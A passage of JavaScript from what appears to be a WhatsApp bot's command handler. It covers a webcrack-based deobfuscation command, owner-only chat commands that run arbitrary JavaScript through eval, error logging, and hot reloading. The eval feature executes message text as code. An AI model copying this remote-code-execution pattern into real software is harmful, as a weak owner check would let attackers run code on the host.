    const isDoc = quoted?.mtype === 'documentMessage';
    const fileName = quoted?.msg?.fileName || '';
    if (!isDoc || !fileName.endsWith('.js')) {
        return await devtrust.sendMessage(m.chat,
            addNewsletterContext({ text: `❌ Reply to a *.js* file that was obfuscated with *.deobfuscate*` }),
            { quoted: m }
        );
    }

    await devtrust.sendMessage(m.chat,
        addNewsletterContext({ text: `🔓 *Deobfuscator*\n⏳ Processing...` }),
        { quoted: m }
    );

    try {
        const fileContent = await downloadWADocument(m, devtrust);
        const { webcrack } = require('webcrack');

        // Run webcrack with the maximum available options,
        // then perform additional cleanup passes afterward.
        const result = await webcrack(fileContent, {
            jsx: false,
            unpackImports: true,
            deobfuscate: true,
            unminify: true,
        });

        let deobfCode = result.code || fileContent;

        // Extra pass: re-run webcrack on the first result —
        // some layered obfuscation only becomes unpackable
        // once the outer layer has been removed.
        try {
            const second = await webcrack(deobfCode, {
                unpackImports: true,
                deobfuscate: true,
                unminify: true,
            });
            if (second.code && second.code.length > 0) deobfCode = second.code;
        } catch (_) { /* second pass is optional, ignore if it fails */ }

        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                document: Buffer.from(deobfCode),
                mimetype: 'application/javascript',
                fileName: `deobfuscated_${fileName}`,
                caption: `✅ *File successfully deobfuscated!*\n⚠️ The result may still be partially obfuscated if the source used advanced techniques (rgf, selfDefending, dispatcher, etc.).`,
            }),
            { quoted: m }
        );
    } catch (error) {
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({ text: `❌ *Error:* ${error.message}` }),
            { quoted: m }
        );
    }
} break;


            default:
                // Check if body exists before trying to use it
                if (body && body.startsWith) {
                    // Safe eval - ONLY for owner and with logging
                    if (body.startsWith('<')) {
                        if (!isCreator) {
                            console.log(`⚠️ Non-owner tried to use eval: ${m.sender}`);
                            return;
                        }

                        try {
                            const result = await eval(`(async () => { return ${body.slice(3)} })()`);
                            const output = util.inspect(result, { depth: 1 });

                            console.log(chalk.yellow(`📝 Eval executed by owner: ${body.slice(3)}`));

                            if (output.length > 4000) {
                                await m.reply('✅ *Executed* (output too long)');
                            } else {
                                await m.reply(output);
                            }
                        } catch (e) {
                            await m.reply(`❌ Error: ${e.message}`);
                        }
                        break;
                    }

                    // Safe async eval - ONLY for owner
                    if (body.startsWith('>')) {
                        if (!isCreator) {
                            console.log(`⚠️ Non-owner tried to use async eval: ${m.sender}`);
                            return;
                        }

                        try {
                            let evaled = await eval(body.slice(2));
                            if (typeof evaled !== 'string') evaled = util.inspect(evaled, { depth: 1 });

                            console.log(chalk.yellow(`📝 Async eval executed by owner`));

                            if (evaled.length > 4000) {
                                await m.reply('✅ *Executed* (output too long)');
                            } else {
                                await m.reply(evaled);
                            }
                        } catch (err) {
                            await m.reply(`❌ Error: ${err.message}`);
                        }
                        break;
                    }
                }
// If no command matched, just ignore
                break;
        }
}
} catch (err) {
    console.log(chalk.red('❌ Command Error:'));
    console.log(chalk.yellow(err.message));

    const match = err.stack.match(/\((.*):(\d+):(\d+)\)/)

    if (match) {
    const { fileURLToPath } = require('url');
    let file = match[1];
    
    if (file.startsWith('file://')) {
        file = fileURLToPath(file);
    }

    const line = parseInt(match[2])


        try {
            const lines = fs.readFileSync(file, 'utf-8').split('\n')
            console.log(chalk.cyan(`📂 ${file}:${line}`))
            console.log(chalk.white(`👉 ${lines[line - 1].trim()}`))
        } catch {
            console.log(chalk.cyan(`📂 ${file}:${line}`))
            console.log(chalk.yellow(`⚠️ Tidak bisa baca file`))
        }
    }

    console.log(chalk.gray(err.stack))
}
}
// ===== SUPPRESS BAD MAC SESSION NOISE (WhatsApp-side issue) =====
process.on('unhandledRejection', (reason) => {
    if (reason && reason.message && (
        reason.message.includes('Bad MAC') ||
        reason.message.includes('Failed to decrypt') ||
        reason.message.includes('bad-request')
    )) {
        // Suppress WhatsApp session noise - not a code error
        return;
    }
    console.error('Unhandled Promise Rejection:', reason);
});
// ================================================================
let file = require.resolve(__filename);

require('fs').watchFile(file, () => {
    require('fs').unwatchFile(file);
    console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
    delete require.cache[file];
    require(file);
});